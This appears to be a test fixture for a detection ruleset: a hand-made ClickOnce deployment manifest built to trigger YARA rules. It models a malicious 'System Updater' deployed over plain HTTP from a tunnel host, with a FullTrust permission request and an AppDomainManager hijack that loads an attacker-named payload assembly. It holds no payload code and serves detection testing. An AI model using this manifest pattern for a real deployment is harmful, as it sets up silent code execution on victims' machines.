@@ -1,0 +1,90 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  Hand-crafted ClickOnce deployment manifest that intentionally triggers every
+  rule in src/rules/clickonce-threats.yar:
+
+    • ClickOnce_HTTP_Deployment          — plain-HTTP codebase
+    • ClickOnce_FullTrust_Requested      — PermissionSet Unrestricted="true"
+    • ClickOnce_AppDomainManager_Override — appDomainManagerAssembly / Type
+    • ClickOnce_Suspicious_Codebase_TLD  — .trycloudflare.com host
+
+  Safe to open — no executable payload, just XML.
+-->
+<asmv1:assembly manifestVersion="1.0"
+                xmlns:asmv1="urn:schemas-microsoft-com:asm.v1"
+                xmlns:asmv2="urn:schemas-microsoft-com:asm.v2"
+                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                xmlns:co.v1="urn:schemas-microsoft-com:clickonce.v1"
+                xmlns:co.v2="urn:schemas-microsoft-com:clickonce.v2"
+                xmlns:dsig="http://www.w3.org/2000/09/xmldsig#"
+                xmlns="urn:schemas-microsoft-com:asm.v2">
+  <assemblyIdentity name="SystemUpdater.application"
+                    version="1.0.0.0"
+                    publicKeyToken="0000000000000000"
+                    language="neutral"
+                    processorArchitecture="msil"
+                    xmlns="urn:schemas-microsoft-com:asm.v1" />
+  <description asmv2:publisher="Totally-Not-Malware Inc."
+               asmv2:product="System Updater"
+               xmlns="urn:schemas-microsoft-com:asm.v1" />
+
+  <!-- Plain-HTTP deployment via ephemeral tunneling host -->
+  <deployment install="true" mapFileExtensions="true" trustURLParameters="true">
+    <subscription>
+      <update>
+        <beforeApplicationStartup />
+      </update>
+    </subscription>
+    <deploymentProvider codebase="http://random-words-abc123.trycloudflare.com/SystemUpdater.application" />
+  </deployment>
+
+  <compatibleFrameworks xmlns="urn:schemas-microsoft-com:clickonce.v2">
+    <framework targetVersion="4.8" profile="Full" supportedRuntime="4.0.30319" />
+  </compatibleFrameworks>
+
+  <!-- FullTrust request + AppDomainManager hijack (T1574.014) -->
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <applicationRequestMinimum>
+        <PermissionSet Unrestricted="true" ID="FullTrust" SameSite="site" />
+        <defaultAssemblyRequest permissionSetReference="FullTrust" />
+      </applicationRequestMinimum>
+    </security>
+  </trustInfo>
+
+  <entryPoint>
+    <assemblyIdentity name="SystemUpdater.exe"
+                      version="1.0.0.0"
+                      publicKeyToken="0000000000000000"
+                      language="neutral"
+                      processorArchitecture="msil" />
+    <commandLine file="SystemUpdater.exe" parameters="/silent /updatenow" />
+  </entryPoint>
+
+  <!-- The dangerous bit: coerce the CLR to load an attacker-controlled manager -->
+  <runtime>
+    <appDomainManagerAssembly value="Payload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
+    <appDomainManagerType value="Payload.EvilManager" />
+    <configurationFile value="SystemUpdater.exe.config" />
+  </runtime>
+
+  <dependency>
+    <dependentAssembly dependencyType="install"
+                       codebase="Application Files\SystemUpdater_1_0_0_0\SystemUpdater.exe.manifest"
+                       size="9001">
+      <assemblyIdentity name="SystemUpdater.exe"
+                        version="1.0.0.0"
+                        publicKeyToken="0000000000000000"
+                        language="neutral"
+                        processorArchitecture="msil"
+                        type="win32" />
+      <hash>
+        <dsig:Transforms>
+          <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
+        </dsig:Transforms>
+        <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha256" />
+        <dsig:DigestValue>deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe</dsig:DigestValue>
+      </hash>
+    </dependentAssembly>
+  </dependency>
+</asmv1:assembly>
